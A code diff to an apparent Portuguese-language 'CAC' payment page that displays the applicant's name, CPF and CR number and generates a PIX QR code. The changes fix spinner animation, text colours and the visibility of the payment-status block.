@@ -5,29 +5,44 @@
 body {
     background-color: #fff !important;
 }
+
+/* Garantir que o spinner funcione */
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.animate-spin {
+    animation: spin 1s linear infinite !important;
+}
+
+/* Garantir visibilidade dos textos */
+#user-name, #user-cpf, #cr-number {
+    color: #6b7280 !important;
+}
 </style>
 <main class="container mx-auto px-4 py-8" style="background-color: #fff; min-height: 100vh;">
         <!-- Formulário CAC -->
         <div class="mb-6" style="text-align: left;">
                 <!-- Spinner de status -->
-                <div class="text-center mb-6">
-                    <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 mb-2" style="border-color: #DC9D33;"></div>
-                    <p class="text-base font-semibold" style="color: #DC9D33;">Aguardando Pagamento</p>
+                <div class="text-center mb-6" style="display: block !important; visibility: visible !important;">
+                    <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 mb-2" style="border-color: #DC9D33 !important; border-bottom-color: #DC9D33 !important; border-top-color: transparent !important; border-left-color: transparent !important; border-right-color: transparent !important; animation: spin 1s linear infinite !important;"></div>
+                    <p class="text-base font-semibold" style="color: #DC9D33 !important;">Aguardando Pagamento</p>
                 </div>
                 
                 <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #e5e7eb;">
                     <label class="text-base" style="font-weight: 600; color: #374151;">REQUERENTE:</label>
-                    <p class="text-base" style="margin: 4px 0; font-weight: 500; color: #eee;" id="user-name">Carregando...</p>
+                    <p class="text-base" style="margin: 4px 0; font-weight: 500; color: #6b7280 !important;" id="user-name">Carregando...</p>
                 </div>
                 
                 <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #e5e7eb;">
                     <label class="text-base" style="font-weight: 600; color: #374151;">CPF:</label>
-                    <p class="text-base" style="margin: 4px 0; font-weight: 500; color: #eee;" id="user-cpf">Carregando...</p>
+                    <p class="text-base" style="margin: 4px 0; font-weight: 500; color: #6b7280 !important;" id="user-cpf">Carregando...</p>
                 </div>
                 
                 <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #e5e7eb;">
                     <label class="text-base" style="font-weight: 600; color: #374151;">Nº CR:</label>
-                    <p class="text-base" style="margin: 4px 0; color: #eee; font-weight: 500;" id="cr-number">000.000.000-00</p>
+                    <p class="text-base" style="margin: 4px 0; color: #6b7280 !important; font-weight: 500;" id="cr-number">000.000.000-00</p>
                 </div>
                 
                 <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #e5e7eb;">
@@ -56,8 +71,8 @@ body {
             </div>
         </div>
 
-        <!-- Status -->
-        <div id="payment-status" class="mb-6">
+        <!-- Status (oculto por padrão) -->
+        <div id="payment-status" class="mb-6 hidden">
             <div id="loading-payment" class="text-center">
                 <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-green-600 mb-2"></div>
                 <p class="text-gray-600">Processando pagamento...</p>
@@ -272,7 +287,11 @@ function initializePayment() {
 }
 
 function showPaymentDetails(paymentData) {
-    document.getElementById('loading-payment').style.display = 'none';
+    // Esconder apenas o spinner secundário, não afetar o principal
+    const paymentStatus = document.getElementById('payment-status');
+    if (paymentStatus) {
+        paymentStatus.classList.add('hidden');
+    }
     document.getElementById('payment-details').classList.remove('hidden');
     
     console.log('PaymentData recebido:', paymentData);
@@ -320,7 +339,11 @@ function generateQRCode(pixCode) {
 }
 
 function showError(message) {
-    document.getElementById('loading-payment').style.display = 'none';
+    // Esconder apenas o spinner secundário, não afetar o principal
+    const paymentStatus = document.getElementById('payment-status');
+    if (paymentStatus) {
+        paymentStatus.classList.add('hidden');
+    }
     document.getElementById('payment-error').classList.remove('hidden');
     document.getElementById('error-message').textContent = message;
 }
@@ -521,7 +544,11 @@ async function sendAdvancedPurchaseEvent() {
 
 function retryPayment() {
     document.getElementById('payment-error').classList.add('hidden');
-    document.getElementById('loading-payment').style.display = 'block';
+    // Mostrar apenas o spinner secundário se necessário
+    const paymentStatus = document.getElementById('payment-status');
+    if (paymentStatus) {
+        paymentStatus.classList.remove('hidden');
+    }
     initializePayment();
 }
 </script>
